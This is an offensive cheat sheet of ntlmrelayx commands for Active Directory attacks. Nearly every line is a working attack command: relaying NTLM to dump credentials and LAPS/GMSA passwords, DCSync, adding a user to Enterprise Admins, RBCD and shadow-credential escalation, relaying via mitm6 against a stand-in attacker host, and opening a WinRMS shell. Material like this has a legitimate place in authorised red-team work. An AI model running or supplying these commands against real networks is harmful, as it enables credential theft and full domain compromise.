# Ntlmrelayx

If only SMBv2 is supported, -smb2support can be used. To attempt the remove the MIC if NTLMv2 is vulnerable to CVE-2019-1040, --remove-mic can be used.

Multiple targets can be specified with -tf list.txt.

### 1) Enumeration

##### With attempt to dump possible GMSA and LAPS passwords, and ADCS templates

    ntlmrelayx.py ldap://dc --dump-adcs --dump-laps --dump-gmsa --no-da --no-acl

### 2) SOCKS Proxy

    ntlmrelayx.py -t smb://target -socks
    ntlmrelayx.py -t mssql://target -socks
    ntlmrelayx.py -t ldaps://target -socks

### 3) Creds dump

    ntlmrelayx.py smb://target

### 4) DCSync if the target in vulnerable to Zerologon

    ntlmrelayx.py dcsync://dc

## Privilege Escalation

### 1) Add an user to Enterprise Admins.

    ntlmrelayx.py ldap://dc --escalate-user user1 --no-dump

### 2) Kerberos Delegation (RBCD in our case)

##### Create a new computer account through LDAPS and enabled RBCD

    ntlmrelayx.py ldaps://dc_IP --add-computer --delegate-access --no-dump --no-da --no-acl

##### Create a new computer account through LDAP with StartTLS and enabled RBCD

    ntlmrelayx.py ldap://dc_IP --add-computer --delegate-access --no-dump --no-da --no-acl

##### Doesn't create a new computer account and use an existing one

    ntlmrelayx.py ldap://dc_IP --escalate-user <controlled_computer> --delegate-access --no-dump --no-da --no-acl

### 3) Shadow Credentials

    ntlmrelayx.py -t ldap://dc02 --shadow-credentials --shadow-target 'dc01$'

### 4) From a mitm6 authentication

##### Attempts to open a socks and write loot likes dumps into a file

    ntlmrelayx.py -tf targets.txt -wh attacker.domain.local -6 -l loot.txt -socks

### 5) Relay to WinRMs

If NTLMv1 is enabled on the source server and accepted by the target, and the target server exposes the WinRMs service (over HTTPS), without forcing CBT.

##### Perform the relay

    ntlmrelayx -t winrms://target.domain.local -smb2support

##### Use the opened WinRMs shell

    nc 127.0.0.1 11000
